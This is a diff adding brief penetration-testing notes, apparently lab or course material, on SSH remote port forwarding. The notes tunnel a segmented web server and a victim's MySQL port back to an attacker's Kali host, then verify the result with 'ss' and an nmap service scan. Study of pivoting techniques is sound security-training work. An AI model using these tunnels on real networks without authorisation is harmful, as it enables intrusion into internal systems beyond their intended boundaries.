@@ -1,1 +1,31 @@
+ssh -R 127.0.0.1:80:192.168.56.33:80 root@192.168.56.31
+
+source first, local host on client port 80
+destination web server on port 80
+ssh connection back to client running at 31
+
+now go back to client and look at netstat -ano | grep LIST | grep tcp
+
+you now have a listener on your local client port 80, if you send traffic to this port it goes backwards through ssh to intermediate to the segmented target
+
+ssh -N -R 10.11.0.x:2221:127.0.0.1:3306 kali@10.11.0.x
+
+With the tunnel up, we can switch to our Kali machine, validate that TCP port 2221 is listening, and scan the localhost on that port with nmap, which will fingerprint the target’s MySQL service:
+
+kali@kali:~$ ss -antp | grep "2221"
+LISTEN   0   128    127.0.0.1:2221     0.0.0.0:*      users:(("sshd",pid=2294,fd=9))
+LISTEN   0   128      [::1]:2221         [::]:*       users:(("sshd",pid=2294,fd=8))
+
+Accessing the MYSQL server on the victim machine through the remote tunnel
+kali@kali:~$ sudo nmap -sS -sV 127.0.0.1 -p 2221
+
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000039s latency).
+
+PORT     STATE SERVICE VERSION
+2221/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1
+
+Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
+  
+Knowing that we can scan the port, we should have no problem interacting with the MySQL service across the SSH tunnel using any of the appropriate Kali-installed tools.
 
